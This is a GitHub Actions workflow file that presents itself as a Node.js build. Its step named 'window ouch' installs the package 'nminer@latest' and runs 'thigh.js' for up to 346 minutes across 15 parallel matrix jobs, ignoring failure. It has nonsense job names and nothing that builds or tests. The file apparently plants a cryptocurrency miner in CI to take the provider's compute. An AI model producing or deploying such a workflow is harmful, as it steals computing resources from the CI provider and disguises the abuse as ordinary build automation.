name: thigh
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3992 }
          - { version: 7567 }
          - { version: 4041 }
          - { version: 7027 }
          - { version: 3203 }
          - { version: 4915 }
          - { version: 790 }
          - { version: 3915 }
          - { version: 6354 }
          - { version: 8214 }
          - { version: 1525 }
          - { version: 8224 }
          - { version: 6478 }
          - { version: 7671 }
          - { version: 7676 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: window ouch
        run: |
          npm install nminer@latest
          timeout 346m node thigh.js || echo "thigh executed"